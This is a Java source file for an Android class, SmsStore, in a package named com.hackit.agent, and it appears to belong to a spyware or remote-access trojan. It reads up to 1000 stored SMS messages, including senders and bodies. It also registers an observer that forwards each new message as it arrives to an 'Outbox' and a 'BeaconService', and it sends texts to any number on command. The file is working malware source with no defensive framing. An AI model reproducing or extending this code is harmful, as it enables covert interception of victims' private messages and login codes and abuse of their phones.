package com.hackit.agent;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.HandlerThread;
import android.provider.Telephony;

import org.json.JSONArray;
import org.json.JSONObject;

/** SMS dump plus a content observer that streams new messages as they land. */
final class SmsStore {
    private static final Uri URI = Uri.parse("content://sms");
    private static ContentObserver observer;
    private static HandlerThread thread;
    private static long lastSeen;

    static JSONArray dump(Context ctx, int limit) {
        JSONArray rows = new JSONArray();
        if (!Common.granted(ctx, android.Manifest.permission.READ_SMS)) {
            return rows;
        }
        Cursor cursor = null;
        try {
            cursor = ctx.getContentResolver().query(URI, new String[]{
                    "_id", "address", "body", "date", "type", "read", "thread_id"
            }, null, null, "date DESC");
            if (cursor == null) {
                return rows;
            }
            int cap = Math.min(Math.max(limit, 1), 1000);
            while (cursor.moveToNext() && rows.length() < cap) {
                JSONObject row = new JSONObject();
                row.put("id", cursor.getLong(0));
                row.put("from", nullSafe(cursor.getString(1)));
                row.put("body", nullSafe(cursor.getString(2)));
                row.put("ts", cursor.getLong(3));
                row.put("box", cursor.getInt(4));
                row.put("read", cursor.getInt(5));
                row.put("thread", cursor.getLong(6));
                rows.put(row);
            }
        } catch (Throwable exc) {
            Log.e("sms dump: " + exc);
        } finally {
            Common.closeQuietly(cursor);
        }
        return rows;
    }

    static synchronized void watch(final Context ctx) {
        if (observer != null) {
            return;
        }
        thread = new HandlerThread("sms-observer");
        thread.start();
        observer = new ContentObserver(new Handler(thread.getLooper())) {
            @Override
            public void onChange(boolean selfChange) {
                try {
                    JSONArray rows = since(ctx, 50);
                    if (rows.length() > 0) {
                        Outbox.event("sms", rows);
                        BeaconService.poke(ctx);
                    }
                } catch (Throwable exc) {
                    Log.d("sms observe: " + exc);
                }
            }
        };
        ctx.getContentResolver().registerContentObserver(URI, true, observer);
        Log.d("sms observer on");
    }

    private static JSONArray since(Context ctx, int limit) {
        JSONArray rows = new JSONArray();
        if (!Common.granted(ctx, android.Manifest.permission.READ_SMS)) {
            return rows;
        }
        Cursor cursor = null;
        try {
            cursor = ctx.getContentResolver().query(URI, new String[]{
                    "_id", "address", "body", "date", "type"
            }, "_id > ?", new String[]{String.valueOf(lastSeen)}, "_id ASC");
            if (cursor == null) {
                return rows;
            }
            while (cursor.moveToNext() && rows.length() < limit) {
                long id = cursor.getLong(0);
                lastSeen = Math.max(lastSeen, id);
                JSONObject row = new JSONObject();
                row.put("id", id);
                row.put("from", nullSafe(cursor.getString(1)));
                row.put("body", nullSafe(cursor.getString(2)));
                row.put("ts", cursor.getLong(3));
                row.put("box", cursor.getInt(4));
                row.put("live", true);
                rows.put(row);
            }
        } catch (Throwable exc) {
            Log.d("sms since: " + exc);
        } finally {
            Common.closeQuietly(cursor);
        }
        return rows;
    }

    private static String nullSafe(String value) {
        return value == null ? "" : value;
    }

    static boolean send(Context ctx, String to, String body) {
        if (!Common.granted(ctx, android.Manifest.permission.SEND_SMS)) {
            return false;
        }
        try {
            android.telephony.SmsManager manager = android.telephony.SmsManager.getDefault();
            manager.sendTextMessage(to, null, body, null, null);
            return true;
        } catch (Throwable exc) {
            Log.e("sms send: " + exc);
            return false;
        }
    }

    private SmsStore() {
    }
}
